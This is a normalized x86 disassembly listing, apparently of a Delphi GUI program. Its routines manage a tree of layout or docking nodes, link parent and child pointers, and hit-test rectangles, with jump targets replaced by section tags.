mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44ad00
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_44ad00
mov ecx ebx
pop edx
call sub_412f2c
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_441f10
mov eax [ ebp - 0x4 ]
call sub_44b134
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_44b134
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_44b134
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_44b134
push ebx
mov ebx eax
mov eax ebx
call sub_44ac3c
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_44abc4
test al al
je r-xdata
mov eax ebx
call sub_44ac70
pop ebx
retn
sub_44b170
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b15c
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44ac0c
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_44b160
mov edx esi
call sub_44b170
sub_44b1ac
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44b134
mov edi eax
mov eax ebx
call sub_44ac70
cmp edi eax
jl r-xdata
mov eax esi
call sub_44ae1c
mov eax [ esi + 0x1c ]
push eax
push sub_44ccbc
mov edx esi
call sub_44b4e8
mov eax ebx
call sub_44b134
mov edi eax
mov eax esi
call sub_44acb8
cmp edi eax
jle r-xdata
mov eax ebx
call sub_44b1ac
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_44b218
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44ac3c
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_44b240
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403314
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403668
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44abe8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d818
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_4246e4
mov edx eax
mov eax ebx
call sub_41d99c
mov eax [ ebp - 0x4 ]
call sub_44b410
xor eax eax
push ebp
push sub_44b34c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_445ab4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_44ae1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b353
mov eax [ ebp - 0x4 ]
call sub_44b414
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_445a78
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44b353
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_44d1e4
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_44b3a8
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_44c414
mov eax [ esi + 0x10 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_44b428
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_44b428
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_44b428
pop ecx
sub_44b480
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_44b428
pop ecx
sub_44b4ac
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44b4ac
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44b4ac
pop ecx
sub_44b500
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_44b480
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_44ad6c
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_44ad6c
push eax
mov edx 0x1
mov eax ebx
call sub_44ad00
push eax
mov edx 0x2
mov eax ebx
call sub_44ad00
pop edx
pop ecx
call sub_412f2c
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402d44
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44b584
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_44afbc
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_412f2c
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_441f10
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44abe8
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_44b480
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_44ac0c
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_44c4ac
mov edx esi
mov eax ebx
call sub_44b480
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_4424f4
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44abe8
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_4424e0
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_44ad6c
mov edx eax
mov eax edi
call sub_44b15c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_44ad6c
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_44ad6c
mov edx eax
mov eax edi
call sub_44b15c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_44ad6c
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_44b794
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_44b93c
jmp r-xdata
sub_44b794
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44abe8
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_44b134
mov edx eax
mov eax ebx
call sub_44b15c
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_44b15c
mov eax [ esi + 0x64 ]
call sub_44b134
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_44c804
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44b4e8
mov eax [ esi + 0x64 ]
call sub_44b134
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_44c804
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44b4e8
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_44cb88
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44b4e8
mov eax [ esi + 0x64 ]
call sub_44b134
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_44ccbc
xor edx edx
mov eax esi
call sub_44b4e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_44b15c
adc edx 0x0
mov eax ebx
call sub_44ae1c
mov eax ebx
call sub_44b1ac
push esi
push sub_44ccbc
xor edx edx
mov eax esi
call sub_44b4e8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_44b93c
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_44ae1c
mov eax [ ebx + 0x14 ]
call sub_44b1ac
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_44b9b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_44b134
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_44b134
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_44b134
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_44ad00
mov esi eax
mov edx 0x2
mov eax ebx
call sub_44ad00
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_44b134
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_44b20c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44b234
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44b20c
call sub_44b9b4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44b234
call sub_44b9b4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_44ad6c
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_44ad6c
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_44bbe0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_445ab4
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_445a78
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_412edc
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44bc74
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_44bbe0
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_44b234
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44b480
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_44b234
call sub_44b9b4
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_44bcfc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_404094
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4046e0
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_44bd44
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44bf3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_44c414
mov eax [ ebp - 0x8 ]
call sub_44b410
xor edx edx
push ebp
push sub_44bf1f
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bf26
mov eax [ ebp - 0x8 ]
call sub_44b414
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44abe8
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_44bcfc
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403540
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_44af08
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_44bcfc
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_442470
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_44329c
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403344
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
